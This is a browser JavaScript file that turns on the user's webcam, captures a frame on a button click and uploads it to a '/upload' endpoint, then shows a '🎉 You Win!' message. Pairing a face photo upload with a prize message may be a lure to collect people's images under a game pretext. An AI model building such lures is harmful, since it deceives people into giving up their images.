const video = document.getElementById("video");
const captureBtn = document.getElementById("captureBtn");
const status = document.getElementById("status");

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (err) {
    console.error("Camera access denied:", err);
    status.innerText = "❌ Camera not accessible";
    status.style.color = "red";
  }
}

captureBtn.addEventListener("click", async () => {
  status.innerText = "📸 Capturing...";
  status.style.color = "yellow";

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, "capture.jpg");

    try {
      const response = await fetch("/upload", {
        method: "POST",
        body: formData,
      });

      if (response.ok) {
        const data = await response.json();
        console.log("✅ Upload success:", data);
        status.innerText = "🎉 You Win!";
        status.style.color = "lime";
      } else {
        throw new Error("Upload failed");
      }
    } catch (error) {
      console.error("❌ Upload error:", error);
      status.innerText = "❌ Upload failed!";
      status.style.color = "red";
    }
  }, "image/jpeg");
});

startCamera();